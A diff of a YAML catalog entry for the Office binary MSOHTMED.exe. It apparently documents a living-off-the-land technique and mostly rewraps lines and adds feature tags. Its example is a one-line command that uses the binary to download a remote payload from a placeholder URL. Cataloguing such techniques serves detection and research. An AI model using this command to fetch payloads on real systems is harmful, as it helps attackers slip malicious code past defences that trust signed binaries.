@@ -2,7 +2,9 @@
 id: windows-download-msohtmed
 namespace: windows:download:msohtmed
 name: msohtmed
-description: 'Microsoft Office component Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSOHTMED.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSOHTMED.exe; C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe.'
+description: 'Microsoft Office component Located at: C:\Program Files (x86)\Microsoft
+  Office 16\ClientX86\Root\Office16\MSOHTMED.exe; C:\Program Files\Microsoft Office
+  16\ClientX64\Root\Office16\MSOHTMED.exe; C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe.'
 author: Nir Chako
 version: 1.0.0
 capabilities:
@@ -41,7 +43,13 @@ resource_profile:
 allowed-tools:
 - msohtmed
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdout
+- remote
+- requires-root
 execution:
   template: msohtmed
   sandbox: execFile
@@ -49,7 +57,8 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache.)
+- description: Downloads payload from remote server (It will download a remote payload
+    and place it in INetCache.)
   command: MsoHtmEd.exe {REMOTEURL}
 references: []
 techniques:
@@ -67,7 +76,6 @@ install:
   commands:
   - choco install msohtmed
 ---
-
 
 # msohtmed
 
